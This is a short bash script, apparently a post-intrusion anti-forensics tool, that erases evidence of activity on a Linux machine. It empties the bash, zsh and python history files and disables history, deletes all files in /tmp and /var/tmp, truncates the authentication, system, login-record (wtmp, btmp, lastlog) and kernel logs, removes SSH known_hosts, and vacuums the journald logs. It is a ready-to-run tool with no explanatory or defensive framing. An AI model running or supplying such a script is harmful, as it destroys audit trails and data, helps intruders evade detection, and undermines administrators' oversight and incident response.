#!/bin/bash
LOGROTATE_CONF="/etc/logrotate.conf"

echo "[*] Cleaning shell history"
if [ -n "$HISTFILE" ]; then
    : > "$HISTFILE" 2>/dev/null
fi
: > ~/.bash_history 2>/dev/null
: > ~/.zsh_history 2>/dev/null
: > ~/.python_history 2>/dev/null
history -c 2>/dev/null
export HISTFILESIZE=0
export HISTSIZE=0

echo "[*] Removing temp files"
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null

echo "[*] Truncating logs"
for log in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/maillog /var/log/mail.log /var/log/kern.log /var/log/dmesg /var/log/boot.log /var/log/lastlog /var/log/wtmp /var/log/btmp; do
    if [ -f "$log" ]; then
        : > "$log" 2>/dev/null && echo "  cleared: $log" || echo "  failed: $log"
    fi
done

echo "[*] Removing SSH connection traces"
rm -f ~/.ssh/known_hosts 2>/dev/null
rm -f ~/.ssh/known_hosts.old 2>/dev/null

echo "[*] Removing journalctl logs"
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null

echo "[*] Clearing lastlog"
: > /var/log/lastlog 2>/dev/null

echo "[*] Done"
